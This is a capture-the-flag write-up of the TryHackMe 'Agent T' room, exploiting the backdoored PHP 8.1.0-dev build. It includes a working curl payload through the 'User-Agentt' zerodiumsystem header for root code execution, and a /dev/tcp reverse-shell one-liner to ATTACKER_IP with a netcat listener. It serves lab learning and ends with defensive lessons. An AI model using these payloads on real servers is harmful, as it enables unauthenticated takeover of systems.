# 🤖 Agent T

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Agent T](https://tryhackme.com/room/agentt) |
| **Difficulty** | 🟢 Easy |
| **Category** | Web, CVE |
| **OS** | Linux |
| **Tools** | nmap, Metasploit, curl |
| **CVE** | CVE-2021-49039 — PHP 8.1.0-dev Backdoor RCE |

---

## 🎯 Objective

Exploit a backdoor planted in the PHP 8.1.0-dev source code to achieve unauthenticated Remote Code Execution.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -oN nmap.txt TARGET_IP
```

**Open ports:**
```
80/tcp  open  http  PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

The version `PHP 8.1.0-dev` is a critical finding — this development version had a backdoor planted by a malicious contributor.

---

## 💥 Exploitation

The PHP 8.1.0-dev backdoor is triggered via the `User-Agentt` header (note the double `t`):

```bash
curl -s http://TARGET_IP -H "User-Agentt: zerodiumsystem('id');"
# Returns: uid=0(root) gid=0(root)
```

Getting a reverse shell:
```bash
# On attacker machine
nc -lvnp 4444

# Curl request with reverse shell
curl -s http://TARGET_IP \
  -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"');"
```

**Root shell obtained.**

Reading the flag:
```bash
cat /flag.txt
```

---

## 📚 Lessons Learned

- Supply chain attacks (backdoors in open source code) are a real and severe threat
- Development/pre-release versions of software should never be deployed in production
- Always check service versions in nmap output — version-specific exploits are highly targeted
- The PHP 8.1.0-dev backdoor was discovered and removed within 3 days — version awareness matters

---
*by OwlRC 🦉 | github.com/OwlRC*
